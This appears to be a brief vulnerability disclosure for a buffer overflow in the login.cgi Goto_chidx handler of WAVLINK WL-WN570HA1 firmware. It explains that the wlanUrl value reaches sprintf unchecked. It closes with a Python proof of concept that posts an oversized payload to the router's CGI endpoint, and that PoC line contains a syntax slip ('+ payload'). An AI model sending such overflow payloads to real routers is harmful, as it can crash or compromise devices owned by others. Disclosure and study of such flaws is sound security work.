# buff overflow

## WAVLINK_WL_WN570HA1

version: 20220621

## Description:

There is a buff overflow in login.cgi/Goto_chidx

## Source:

you may download it from : https://www.wavlink.com/en_us/firmware/details/762dc36209.html

## Analyse:


![](8.png)

get value from wlanUrl

and call sprintf, cause buff overflow

## POC
```
url = "http://192.168.0.1/cgi-bin/login.cgi"
payload = 'a'*0x1000 + '\n'

r = requests.post(url, data={ 'page':'Goto_chidx', 'wlanUrl': + payload})
``` 
